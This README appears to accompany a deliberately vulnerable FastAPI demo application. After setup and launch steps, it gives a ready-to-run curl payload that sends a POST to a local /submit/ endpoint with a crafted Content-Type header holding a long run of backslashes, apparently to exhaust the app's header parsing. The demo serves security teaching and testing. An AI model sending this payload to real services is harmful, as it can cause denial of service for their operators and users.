
# Vulnerable FastAPI Security demo application

## Setup

Clone the project and proceed to installing all the dependencies:

```bash
pip install -r requirements.txt
```

Then start the application:

```bash
uvicorn main:app --reload
```

## Execute the payload

```bash
curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/'
```

